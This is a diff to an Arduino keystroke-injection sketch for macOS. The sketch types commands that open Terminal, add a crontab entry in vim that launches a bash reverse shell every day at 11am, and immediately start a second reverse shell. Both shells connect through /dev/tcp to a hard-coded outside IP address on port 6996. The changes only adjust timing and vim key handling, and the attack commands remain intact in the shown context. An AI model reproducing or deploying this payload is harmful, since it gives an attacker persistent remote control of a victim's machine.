@@ -27,19 +27,16 @@ void setup()
   // Set default delay 200ms
   // Command + Space ==> spotlight search
   Keyboard.press(KEY_LEFT_GUI);
-  delay(200);
   Keyboard.press(' ');
-  delay(200);
   Keyboard.releaseAll();
 
   // Search for termina
-  delay(200);
+  delay(2000);
   Keyboard.print(F("terminal"));
 
-  delay(200);
   typeKey(KEY_RETURN);
 
-  delay(300);
+  delay(2000);
   Keyboard.print(F("bash"));
 
   typeKey(KEY_RETURN);
@@ -70,17 +67,21 @@ void setup()
   Keyboard.print(F("$"));
 
   typeKey(KEY_RETURN);
-  
+
+  // start insert mode
   delay(2000);
   Keyboard.print(F("i"));
 
   typeKey(KEY_RETURN);
-  
+
   // set the reverse shell to occur 11am every day
   delay(2000);
   Keyboard.print(F("0 11 * * * /bin/sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\\\" && exit"));
 
   typeKey(KEY_RETURN);
+
+  // exit insert mode
+  typeKey(KEY_ESC);
 
   // Exit vim
   delay(2000);
@@ -89,8 +90,8 @@ void setup()
   typeKey(KEY_RETURN);
 
   // spawns a reverse shell in background
-  delay(200);
-  Keyboard.print(F("sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\" && exit"));
+  delay(2000);
+  Keyboard.print(F('sh -c "/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &" && exit'));
 
   typeKey(KEY_RETURN);
 
